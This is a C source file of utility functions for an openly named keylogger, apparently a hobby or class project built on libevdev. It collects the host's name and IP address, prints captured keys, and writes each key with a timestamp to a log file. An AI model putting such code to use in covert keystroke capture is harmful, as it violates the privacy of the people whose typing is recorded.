/**
 * Utilities that help the keylogger function.
 */

#include "keylogger.h"

#include "server_utils.h"

// for keylogging
#define _POSIX_SOURCE
#include <arpa/inet.h>  // display hostname
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
// the libevdev library has warnings for the variable names being too short
// NOLINTNEXTLINE
#include <libevdev/libevdev.h>
#include <netdb.h>       // display hostname
#include <netinet/in.h>  // display hostname
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>  // display hostname
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

// NOLINTBEGIN
// Listen, most of this is just what libevdev told us to do. We got a bunch of
// complaints about how our variables work, but we're not sure how to fix it

// tAn indicator for when to stop the keylogging loop. 0 = stop.
int log_indicator = 1;

void check_IP_buffer(char* IPbuffer) {
  if (NULL == IPbuffer) {
    error_and_exit("IP buffer not initialized.");
  }
}

void log_device(key_package* package) {
  const int hostbuffer_size = 256;
  char hostbuffer[hostbuffer_size];
  char* IPbuffer = "";
  struct hostent* host_entry = NULL;
  int hostname = 0;

  // To retrieve hostname
  hostname = gethostname(hostbuffer, sizeof(hostbuffer));
  if (hostname == -1) {
    error_and_exit("Error retreiving host name.");
  }

  // To retrieve host information
  host_entry = gethostbyname(hostbuffer);
  if (host_entry == NULL) {
    error_and_exit("Error receiving host information.");
  }

  // To convert an Internet network
  // address into ASCII string
  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));

  // for some reason these fields cause breaks. idk why
  // key_package->host_device_name = hostbuffer;
  // key_package->host_device_IP = IPbuffer;

  printf("Host name: %s\n", hostbuffer);
  printf("Host IP: %s\n", IPbuffer);
}

void reset_structs(key_package* package) { package->keys_arr_size = 0; }

void print_logged_keys(key_package package) {
  printf("All keys in key_package struct: \n");

  for (size_t i = 0; i < package.keys_arr_size; i++) {
    printf("%s  ", package.keys[i].key);
  }
  printf("\n");
}

void keys_to_file(FILE* package_log, key_package package) {
  char* line = "";
  for (size_t i = 0; i < package.keys_arr_size; i++) {
    (void)fprintf(package_log, "Key:");
    (void)fprintf(package_log, "%s", package.keys[i].key);
    (void)fprintf(package_log, " Timestamp: ");
    (void)fprintf(package_log, "%s", package.keys[i].timestamp);

    (void)fprintf(package_log, "\t");
  }

  (void)fprintf(package_log, "\n");
}
// NOLINTEND
